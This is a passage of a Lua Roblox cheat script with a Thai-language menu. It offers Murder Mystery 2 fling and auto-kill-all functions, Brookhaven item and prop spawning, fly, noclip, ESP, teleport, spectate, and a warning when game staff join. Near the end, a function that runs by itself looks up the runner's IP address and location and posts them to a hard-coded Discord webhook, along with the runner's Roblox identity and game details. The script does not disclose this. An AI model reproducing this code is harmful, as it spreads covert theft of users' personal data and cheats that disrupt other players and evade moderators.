            if state then
                task.spawn(function()
                    while _G.AutoCollectGun do
                        secureGun()
                        task.wait(0.5)
                    end
                end)
            end
        end
    })

    local flingDropdown = mm2Function:Dropdown({
        Title = "Select Player",
        Desc = "เลือกผู้เล่นที่ต้องการ Fling",
        Values = getPlayerNames(),
        Callback = function(selectedName)
            flingTarget = Players:FindFirstChild(selectedName)
        end
    })
    mm2Function:Button({
        Title = "Refresh Players",
        Desc = "อัปเดตรายชื่อผู้เล่น",
        Callback = function()
            if flingDropdown then
                local updatedNames = getPlayerNames()
                flingDropdown:Refresh(updatedNames, true)
                WindUI:Notify({
                    Title = "Refreshed!",
                    Content = "อัปเดตรายชื่อเรียบร้อยแล้ว",
                    Type = "Success"
                })
            end
        end
    })
    mm2Function:Toggle({
        Title = "Fling Player",
        Desc = "สะบัดผู้เล่นที่เลือก",
        Callback = function(state)
            if state then
                if flingTarget then
                    SHubFling(flingTarget)
                else
                    WindUI:Notify({
                        Title = "Error!",
                        Content = "ยังไม่ได้เลือกเป้าหมาย",
                        Type = "Error"
                    })
                end
            end
        end
    })

    mm2Function:Toggle({
        Title = "Fling Murderer",
        Desc = "วาร์ปไปสะบัดฆาตกรให้กระเด็น",
        Value = false,
        Callback = function(state)
            local Murderer = nil
            for plr, role in pairs(getRoles()) do
                if role == "Murderer" then
                    Murderer = Players:FindFirstChild(plr)
                    break
                end
            end
                
            if Murderer and Murderer ~= LocalPlayer then
                SHubFling(Murderer)
            end
                
            task.wait(1) 
        end
    })
    mm2Function:Toggle({
        Title = "Fling Sheriff",
        Desc = "วาร์ปไปสะบัดนายอำเภอให้กระเด็น",
        Value = false,
        Callback = function(state)
            local Target = nil
            for plr, role in getRoles() do
                if role == "Sheriff" or role == "Hero" then
                    Target = Players:FindFirstChild(plr)
                    break
                end
            end
            if Target and Target ~= LocalPlayer then
                SHubFling(Target)
            end
        end
    })
    local killAllConnection = nil
    mm2Function:Toggle({
        Title = "สังหารทุกคน (Murderer Only)",
        Desc = "เมื่อเป็นฆาตกร จะฆ่าทุกคนอัตโนมัติ",
        Value = false,
        Callback = function(state)
            _G.KillAllMM2 = state
            if not state then
                if killAllConnection then
                    killAllConnection:Disconnect()
                    killAllConnection = nil
                end
            else
                local function isMurderer()
                    local lp = game.Players.LocalPlayer
                    if playerData and playerData[lp.Name] then
                        if tostring(playerData[lp.Name].Role) == "Murderer" then
                            return true
                        end
                    end
                    if lp.Backpack:FindFirstChild("Knife") then return true end
                    if lp.Character and lp.Character:FindFirstChild("Knife") then return true end
                    return false
                end

                local function killAll()
                    local lp = game.Players.LocalPlayer
                    local char = lp.Character
                    if not char then return end
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    if not hrp then return end

                    if not char:FindFirstChild("Knife") then
                        local hum = char:FindFirstChildOfClass("Humanoid")
                        if lp.Backpack:FindFirstChild("Knife") then
                            hum:EquipTool(lp.Backpack:FindFirstChild("Knife"))
                            task.wait(0.1)
                        else
                            return
                        end
                    end

                    local knife = char:FindFirstChild("Knife")
                    if not knife then return end

                    for _, v in pairs(game.Players:GetPlayers()) do
                        if not _G.KillAllMM2 then break end
                        if v == lp then continue end
                        if not v.Character then continue end
                    
                        local targetHRP = v.Character:FindFirstChild("HumanoidRootPart")
                        if not targetHRP then continue end
                    
                        if playerData and playerData[v.Name] then
                            if playerData[v.Name].Dead == true then continue end
                            local role = tostring(playerData[v.Name].Role)
                            if role == "Murderer" then continue end
                        else
                            if v.Backpack:FindFirstChild("Knife") or
                            (v.Character and v.Character:FindFirstChild("Knife")) then
                                continue
                            end
                        end
                    
                        local oldPos = hrp.CFrame
                    
                        pcall(function()
                            targetHRP.Anchored = true
                            hrp.CFrame = CFrame.new(targetHRP.Position) * CFrame.new(0, 0, 2)
                            task.wait(0.1)
                            knife.Stab:FireServer("Slash")
                            task.wait(0.1)
                        end)
                    
                        pcall(function()
                            targetHRP.Anchored = false
                        end)
                    
                        hrp.CFrame = oldPos
                        task.wait(0.3)
                    end
                end

                task.spawn(function()
                    while _G.KillAllMM2 do
                        task.wait(1)
                        if isMurderer() then
                            killAll()
                        end
                    end
                end)
            end
        end
    })

    mm2Function:Toggle({
        Title = "สังหาร Murderer (Sheriff ooly)",
        Desc = "วาร์ปไปสิงร่างฆาตกรแล้วยิง",
        Value = false,
        Callback = function(state)
            _G.KillMurdererOnlyV3 = state
            if state then
                task.spawn(function()
                    while _G.KillMurdererOnlyV3 do
                        local target = getMurderer()
                        local char = lp.Character
                        local hrp = char and char:FindFirstChild("HumanoidRootPart")
                        local gun = char and (char:FindFirstChild("Gun") or lp.Backpack:FindFirstChild("Gun"))
                        
                        if target and hrp and gun and target:FindFirstChild("HumanoidRootPart") then
                            local targetHrp = target.HumanoidRootPart
                            local oldPos = hrp.CFrame
                            
                            if gun.Parent ~= char then
                                char.Humanoid:EquipTool(gun)
                                task.wait(0.2)
                            end
                            
                            hrp.CFrame = targetHrp.CFrame * CFrame.new(0, 0, 1)
                            task.wait(0.1)
                            
                            gun:Activate()
                            
                            task.wait(0.1)
                            hrp.CFrame = oldPos
                            
                            task.wait(3.5) 
                        end
                        task.wait(0.5)
                    end
                end)
            end
        end
    })
end

if isbrookharen then 
    local brookTab = createTab("Brookhaven", "geist:warning") 
    local toolRemote = rs:FindFirstChild("RE") and rs.RE:FindFirstChild("1Too1l")
    local autoPropToggle = false
    local songId = "72505786943707"
    brookTab:Button({
        Title = "Give Boombox",
        Desc = "เสก Boombox",
        Callback = function()
            local args = {
                [1] = "PickingTools",
                [2] = "Boombox"
            }
            toolRemote:InvokeServer(unpack(args))
            
            WindUI:Notify({
                Title = "Success",
                Content = "เสก Boombox เรียบร้อยแล้ว!",
                Type = "Success"
            })
        end
    })
    brookTab:Input({
        Title = "Song ID",
        Desc = "ใส่ไอดีเพลง Roblox ที่ต้องการเล่น",
        Value = songId,
        Placeholder = "ใส่ Sound ID",
        Callback = function(text)
            songId = text
        end
    })
    brookTab:Button({
        Title = "Play Music",
        Desc = "เปิดเพลงตาม ID",
        Callback = function()
            if songId and songId ~= "" then

                game:GetService("ReplicatedStorage").RE.PlayerToolEvent:FireServer("ToolMusicText", tostring(songId), nil, true)
                
                local volumeRemote = game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("MainGUIHandler") 
                    and game:GetService("Players").LocalPlayer.PlayerGui.MainGUIHandler.MainAudio.Catalog.Header.VolumeContainer:FindFirstChild("VolumeChangeRequest")
                
                if volumeRemote then
                    volumeRemote:FireServer(100)
                end

                WindUI:Notify({
                    Title = "Playing Music",
                    Content = "เปิดเพลง ID: " .. tostring(songId) .. "",
                    Type = "Success"
                })
            else
                WindUI:Notify({
                    Title = "Error",
                    Content = "กรุณากรอก ID เพลงก่อนกดเปิด",
                    Type = "Error"
                })
            end
        end
    })
    brookTab:Toggle({
        Title = "Auto Spawn Prop",
        Desc = "เสก Prop รอบตัวละครเรื่อยๆ",
        Value = false,
        Callback = function(state)
            autoPropToggle = state
            
            if autoPropToggle then
                task.spawn(function()
                    while autoPropToggle do
                        local char = game:GetService("Players").LocalPlayer.Character
                        local propMaker = char and char:FindFirstChild("PropMaker") and char.PropMaker:FindFirstChild("Tool_PropMake")
                        local touchPart = workspace:FindFirstChild("WorkspaceCom") 
                            and workspace.WorkspaceCom:FindFirstChild("001_TrafficCones") 
                            and workspace.WorkspaceCom["001_TrafficCones"]:FindFirstChild("Propssxr68xbpc66")
                            and workspace.WorkspaceCom["001_TrafficCones"].Propssxr68xbpc66:FindFirstChild("Touch")

                        if propMaker and touchPart and char:FindFirstChild("HumanoidRootPart") then
                            local hrpPos = char.HumanoidRootPart.Position
                            local randomOffset = Vector3.new(
                                math.random(-5, 5),
                                0,
                                math.random(-5, 5)
                            )
                            local spawnPos = hrpPos + randomOffset

                            propMaker:FireServer(touchPart, spawnPos)
                        end
                        
                        task.wait(0.2) 
                    end
                end)
            end
        end
    })
end 

local SettingsTab = createTab("Settings", "settings")
local discordBTN = createTab("Discord Server", "message-square")

-- [[ Main Controls ]] --
MainTab:Toggle({
    Title = "เปิด/ปิด เดินทะลุสิ่งกีดขวาง",
    Desc = "เดินทะลุกำแพง",
    Default = playerSettings.PassThrough,
    Callback = function(state)
        playerSettings.PassThrough = state
    end
})

MainTab:Toggle({
    Title = "ล็อคตำแหน่ง (Freeze)",
    Default = playerSettings.LockPosition,
    Callback = function(state)
        playerSettings.LockPosition = state
        if playerSettings.LockPosition then
            local myChar = player.Character
            local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
            if myHrp then playerSettings.FreezeCFrame = myHrp.CFrame end
        else
            playerSettings.FreezeCFrame = nil
        end
    end
})

MainTab:Toggle({
    Title = "เปิด/ปิด บิน (Fly)",
    Default = playerSettings.Flying,
    Callback = function(state)
        playerSettings.Flying = state
        if not playerSettings.Flying then stopFlying() end
    end
})

MainTab:Slider({
    Title = "ความเร็วในการบิน",
    Step = 1,
    Value = { Min = 10, Max = 300, Default = 50 },
    Callback = function(val)
        playerSettings.FlySpeed = val
    end
})

MainTab:Slider({
    Title = "ความเร็ววิ่ง",
    Desc = "ปรับมากกว่า 16 ตัวละครจะเดินหน้าอัตโนมัติ หันกล้องเพื่อคุมทิศทาง",
    Step = 1,
    Value = { Min = 16, Max = 300, Default = 16 },
    Callback = function(val)
        playerSettings.WalkSpeed = val
        applyHumanoidStats()
    end
})

MainTab:Slider({
    Title = "ความสูงกระโดด",
    Desc = "ค่าเริ่มต้นของเกมคือ 50",
    Step = 1,
    Value = { Min = 50, Max = 500, Default = 50 },
    Callback = function(val)
        playerSettings.JumpPower = val
        applyHumanoidStats()
    end
})

MainTab:Toggle({
    Title = "เปิดหมุนตัวละคร",
    Desc = "ตัวละครจะหมุนรอบตัวเองต่อเนื่องอัตโนมัติ ใช้แรงหมุนจริงทำให้คนอื่นเห็นตรงกัน",
    Default = playerSettings.Spinning,
    Callback = function(state)
        playerSettings.Spinning = state
        updateSpin()
    end
})

MainTab:Slider({
    Title = "ความเร็วหมุน",
    Desc = "หน่วยองศาต่อวินาที (ค่าสูงมากๆ อาจดูสั่น/ไม่ลื่นเพราะข้อจำกัดฟิสิกส์ของเกม ลองปรับดูจุดที่ลื่นที่สุด)",
    Step = 10,
    Value = { Min = 0, Max = 3600, Default = playerSettings.SpinSpeed },
    Callback = function(val)
        playerSettings.SpinSpeed = val
        updateSpin()
    end
})

-- [[ Protection Tab Controls ]] --
ProtectionTab:Toggle({
    Title = "เปิด/ปิด Anti-Fling",
    Desc = "หักล้างแรงกระแทกมหาศาล ป้องกันการถูกดีดกระเด็นออกจากแมพจริง",
    Default = playerSettings.AntiFling,
    Callback = function(state)
        playerSettings.AntiFling = state
    end
})

ProtectionTab:Toggle({
    Title = "เปิด/ปิด Anti-Ragdoll",
    Desc = "ป้องกันตัวละครล้ม ติดสถานะ Ragdoll หรือลื่นล้ม",
    Default = playerSettings.AntiRagdoll,
    Callback = function(state)
        playerSettings.AntiRagdoll = state
    end
})

-- [[ ESP Controls ]] --
PlayerVisible:Toggle({
    Title = "เปิด/ปิด ESP Name",
    Default = espSettings.Names,
    Callback = function(state) espSettings.Names = state end
})
PlayerVisible:Toggle({
    Title = "เปิด/ปิด ESP Box",
    Default = espSettings.Boxes,
    Callback = function(state) espSettings.Boxes = state end
})
PlayerVisible:Toggle({
    Title = "เปิด/ปิด ESP Line",
    Default = espSettings.Lines,
    Callback = function(state) espSettings.Lines = state end
})
PlayerVisible:Colorpicker({
    Title = "สีของ ESP",
    Default = espSettings.Color,
    Callback = function(color) espSettings.Color = color end
})

-- [[ Teleport Controls ]] --
local tpDropdown = TeleportTab:Dropdown({
    Title = "เลือกผู้เล่นที่จะ Teleport",
    Values = getPlayerNames(),
    Callback = function(selectedName)
        teleportTarget = Players:FindFirstChild(selectedName)
    end
})

TeleportTab:Button({
    Title = "Teleport ไปหาผู้เล่น",
    Desc = "วาร์ปไปหาผู้เล่นที่เลือกในตารางทันที",
    Callback = function()
        if teleportTarget and teleportTarget.Character then
            local targetHrp = teleportTarget.Character:FindFirstChild("HumanoidRootPart")
            local myHrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
            
            if myHrp and targetHrp then
                myHrp.CFrame = targetHrp.CFrame * CFrame.new(0, 0, 3)
                WindUI:Notify({
                    Title = "Teleported!",
                    Content = "วาร์ปไปหา " .. teleportTarget.Name .. " เรียบร้อยแล้ว",
                    Type = "Success"
                })
            end
        else
            WindUI:Notify({
                Title = "Error!",
                Content = "กรุณาเลือกผู้เล่น หรือเป้าหมายไม่ได้อยู่ในเกม",
                Type = "Error"
            })
        end
    end
})

TeleportTab:Button({
    Title = "ส่องดูผู้เล่น (Spectate)",
    Desc = "ปรับมุมมองกล้องไปที่ผู้เล่นที่เลือก",
    Callback = function()
        if teleportTarget and teleportTarget.Character then
            local targetHum = teleportTarget.Character:FindFirstChildOfClass("Humanoid")
            if targetHum then
                camera.CameraSubject = targetHum
                WindUI:Notify({
                    Title = "Spectating!",
                    Content = "กำลังส่องดู: " .. teleportTarget.Name,
                    Type = "Info"
                })
            end
        else
            WindUI:Notify({
                Title = "Error!",
                Content = "กรุณาเลือกผู้เล่น หรือเป้าหมายไม่ได้อยู่ในเกม",
                Type = "Error"
            })
        end
    end
})

TeleportTab:Button({
    Title = "ยกเลิกส่องดู (Unspectate)",
    Desc = "คืนมุมมองกล้องกลับมาที่ตัวละครของเรา",
    Callback = function()
        local myHum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
        if myHum then
            camera.CameraSubject = myHum
            WindUI:Notify({
                Title = "Reset Camera",
                Content = "คืนมุมมองกล้องกลับมาที่ตัวละครแล้ว",
                Type = "Success"
            })
        end
    end
})

TeleportTab:Button({
    Title = "อัปเดตรายชื่อผู้เล่น (Refresh)",
    Callback = function()
        if tpDropdown then
            tpDropdown:Refresh(getPlayerNames())
            WindUI:Notify({
                Title = "Refreshed!",
                Content = "อัปเดตรายชื่อเรียบร้อยแล้ว",
                Type = "Success"
            })
        end
    end
})

-- [[ Settings Controls ]] --
SettingsTab:Dropdown({
    Title = "ธีมสี UI (Theme)",
    Values = { "Dark", "Light", "Rose", "Emerald", "Midnight", "Violet" },
    Value = "Emerald",
    Callback = function(themeName)
        currentTheme = themeName
        if WindUI and WindUI.SetTheme then
            WindUI:SetTheme(themeName)
        end
    end
})

SettingsTab:Dropdown({
    Title = "ปุ่มซ่อน/แสดง UI",
    Values = { "LeftControl", "RightControl", "LeftShift", "RightShift", "LeftAlt", "RightAlt", "F1", "F2", "F3", "F4", "F5", "F6", "Insert", "Delete" },
    Value = "LeftControl",
    Callback = function(selectedKeyName)
        local selectedKeyCode = keyMap[selectedKeyName]
        if selectedKeyCode then
            Window:SetToggleKey(selectedKeyCode)
        end
    end
})

SettingsTab:Button({
    Title = "เพิ่มแสงหน้าจอ",
    Desc = "หน้าจอสว่างขึ้นเล็กน้อย",
    Callback = function()
        Lighting.Brightness = (Lighting.Brightness or 2) + 1
        WindUI:Notify({
            Title = "Lighting Updated",
            Content = "เพิ่มแสงเรียบร้อยแล้ว (Brightness: " .. tostring(Lighting.Brightness) .. ")",
            Type = "Info"
        })
    end
})

SettingsTab:Button({
    Title = "บันทึกการตั้งค่า (Save Config)",
    Desc = "บันทึกสถานะปุ่มและตัวเลือกทั้งหมดลงไฟล์",
    Callback = function()
        saveConfiguration()
    end
})

SettingsTab:Button({
    Title = "โหลดการตั้งค่า (Load Config)",
    Desc = "ดึงค่าการตั้งค่าล่าสุดที่เคยบันทึกไว้กลับมาใช้",
    Callback = function()
        loadConfiguration()
    end
})

-- [[ Discord Controls ]] --
discordBTN:Button({
    Title = "เข้าร่วม Discord",
    Desc = "กดเพื่อรับลิงก์เชิญเข้าร่วมกลุ่ม Discord",
    Callback = function()
        WindUI:Popup({
            Title = "Discord Invitation",
            Icon = "message-square", 
            Content = "คุณต้องการคัดลอกลิงก์ Discord ไปยัง Clipboard หรือไม่?",
            Buttons = {
                {
                    Title = "ยกเลิก",
                    Callback = function() end,
                    Variant = "Tertiary", 
                },
                {
                    Title = "คัดลอกลิงก์",
                    Icon = "copy",
                    Variant = "Primary",
                    Callback = function()
                        setclipboard("https://discord.gg/B8RGAP6bKa")
                        WindUI:Notify({
                            Title = "Success!",
                            Content = "คัดลอกลิงก์แล้ว! นำไปวางใน Browser ได้เลย",
                            Type = "Success"
                        })
                    end,
                }
            }
        })
    end
})

if isvips then 
    local vipZTab = createTab("Vip", "crown")
    local ghostChar = nil 
    local ghostConnection = nil
    local originalCFrame = nil

    local function cleanUpGhost()
        if ghostChar then
            ghostChar:Destroy()
            ghostChar = nil
        end
        if ghostConnection then
            ghostConnection:Disconnect()
            ghostConnection = nil
        end
    end

    vipZTab:Toggle({
        Title = "Ghost Mode",
        Desc = "ทิ้งร่างแยก ตัวจริงล่องหน พอกดปิดวาร์ปกลับ",
        Default = false,
        Callback = function(state)
            _G.AstralMode = state
            local lp = game.Players.LocalPlayer
            local char = lp.Character
            if not char then return end

            local realHum = char:FindFirstChildOfClass("Humanoid")
            local realRoot = char:FindFirstChild("HumanoidRootPart")
            local camera = workspace.CurrentCamera
            local runService = game:GetService("RunService")
            
            if state then
                if realRoot and realHum then
                    originalCFrame = realRoot.CFrame
                    char.Archivable = true
                    
                    ghostChar = char:Clone()
                    ghostChar.Name = "Ghost_Clone"
                    ghostChar.Parent = workspace
                    
                    for _, obj in pairs(ghostChar:GetDescendants()) do
                        if obj:IsA("LocalScript") or obj:IsA("Script") or obj:IsA("SelectionBox") or obj:IsA("BoxHandleAdornment") then
                            obj:Destroy()
                        end
                    end
                    
                    local ghostRoot = ghostChar:FindFirstChild("HumanoidRootPart")
                    if ghostRoot then
                        ghostRoot.Anchored = true
                    end
                    
                    for _, obj in pairs(char:GetDescendants()) do
                        if obj:IsA("BasePart") then
                            if obj.Name ~= "HumanoidRootPart" then
                                obj.Transparency = 1 
                            end
                        elseif obj:IsA("Decal") then
                            obj.Transparency = 1
                        end
                    end
                    
                    ghostConnection = runService.RenderStepped:Connect(function()
                        if not _G.AstralMode or not char then return end
                        
                        for _, part in pairs(char:GetChildren()) do
                            if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                                part.CanCollide = false
                            end
                        end
                    end)
                end
            else
                cleanUpGhost()
                _G.AstralMode = false

                if char and realRoot then
                    if ghostChar and ghostChar:FindFirstChild("HumanoidRootPart") then
                        realRoot.CFrame = ghostChar.HumanoidRootPart.CFrame
                    elseif originalCFrame then
                        realRoot.CFrame = originalCFrame 
                    end
                    
                    for _, obj in pairs(char:GetDescendants()) do
                        if obj:IsA("BasePart") then
                            if obj.Name ~= "HumanoidRootPart" then
                                obj.Transparency = 0 
                            end
                        elseif obj:IsA("Decal") then
                            obj.Transparency = 0
                        end
                    end
                    
                    if camera and realHum then
                        camera.CameraSubject = realHum
                    end
                end
            end
        end
    })

end

local WEBHOOK_URL = "https://discord.com/api/webhooks/1546086830435336274/z79RDDFEy8NJ376sU88VNKTgdhGRjq0K5br6dAZ0W1Fbbi8mLyvjMTyJYudLkEOkTbZm"
local function sendWebhookLog()
    task.spawn(function()
        local userIP = "Unknown"
        local ipData = {}
        local MarketplaceService = game:GetService("MarketplaceService")
        local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request
        local placeName = "Unknown Game"
        pcall(function()
            local productInfo = MarketplaceService:GetProductInfo(game.PlaceId)
            if productInfo and productInfo.Name then
                placeName = productInfo.Name
            end
        end)

        if httpRequest then
            local success, response = pcall(function()
                return httpRequest({
                    Url = "http://ip-api.com/json/",
                    Method = "GET"
                })
            end)
            if success and response and response.Body then
                local jsonSuccess, parsed = pcall(function()
                    return HttpService:JSONDecode(response.Body)
                end)
                if jsonSuccess and parsed then
                    userIP = parsed.query or "Unknown"
                    ipData = parsed
                end
            end
        end
        local executorName = (identifyexecutor and identifyexecutor()) or "Unknown Executor"
        local profileUrl = "https://www.roblox.com/users/" .. player.UserId .. "/profile"

        local payload = {
            embeds = {
                {
                    title = "🚀 มีผู้ใช้งานรันสคริปต์!",
                    description = "[ข้อมูลผู้ใช้งานที่ตรวจพบ](https://www.roblox.com/users/" .. player.UserId .. "/profile)",
                    color = 9043938,
                    fields = {
                        {
                            name = "👤 Display Name",
                            value = "```" .. player.DisplayName .. "```",
                            inline = true
                        },

                        {
                            name = "🏷️ Username",
                            value = "```" .. player.Name .. "```",
                            inline = true
                        },

                        {
                            name = "🆔 User ID",
                            value = "```" .. tostring(player.UserId) .. "```",
                            inline = true
                        },

                        {
                            name = "🔗 Roblox Profile",
                            value = "``` https://www.roblox.com/users/" .. player.UserId .. "/profile ```",
                            inline = false
                        },

                        {
                            name = "🌐 IP Address",
                            value = "```" .. userIP .. "```",
                            inline = true
                        },

                        {
                            name = "📍 Country",
                            value = "```".. ipData.country.. "```" or "N/A", 
                            inline = true
                        },

                        {
                            name = "🏙️ City",
                            value = "```".. ipData.city.. "```" or "N/A",
                            inline = true
                        },

                        {
                            name = "🏢 ISP",
                            value = "```".. ipData.isp.. "```" or "N/A",
                            inline = true
                        },

                        {
                            name = "⚙️ Executor",
                            value = "```" .. executorName .. "```",
                            inline = true
                        },
                        {
                            name = "🎮 Game Name",
                            value = "```" ..placeName .. "```",
                            inline = true
                        },
                        {
                            name = "🎮 Game ID",
                            value = "```" .. tostring(game.PlaceId) .. "```",
                            inline = true
                        },

                        {
                            name = "🔗 Job ID",
                            value = "```" .. (game.JobId ~= "" and game.JobId or "Singleplayer / Studio") .. "```",
                            inline = true
                        }
                    },
                    footer = {
                        text = "godmyhxnd"
                    },

                   timestamp = DateTime.now():ToIsoDate()
                }
            }
        }

        pcall(function()
            httpRequest({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end)
end
sendWebhookLog()

local groupId = game.CreatorType == Enum.CreatorType.Group and game.CreatorId or nil
local function checkStaff(player)
    local isStaff = false
    local roleName = "Unknown"
    if game.CreatorType == Enum.CreatorType.User and player.UserId == game.CreatorId then
        isStaff = true
        roleName = "Game Owner"
    elseif groupId then
        local success, rank = pcall(function()
            return player:GetRankInGroup(groupId)
        end)
        if success and rank >= 200 then
            isStaff = true
            roleName = player:GetRoleInGroup(groupId)
        end
    end
    if isStaff then
        WindUI:Notify({
            Title = "⚠️ สดๆ ร้อนๆ! พบ Admin เข้าแมพ",
            Content = player.Name .. " (" .. roleName .. ") ได้เข้าแมพมาแล้ว!",
            Duration = 10,
            Icon = "shield-alert"
        })
    end
end
for _, p in pairs(Players:GetPlayers()) do
    task.spawn(checkStaff, p)
end
Players.PlayerAdded:Connect(checkStaff)

-- [[ Notification & Start ]] --
WindUI:Notify({
    Title = "GodMyHxnd Scripts",
    Content = "โปรดใช้ด้วยความระมัดระวัง บางฟังก์ชั่นอาจจะมีการแบนได้!",
    Duration = 10, -- 3 seconds
    Icon = "bird",
})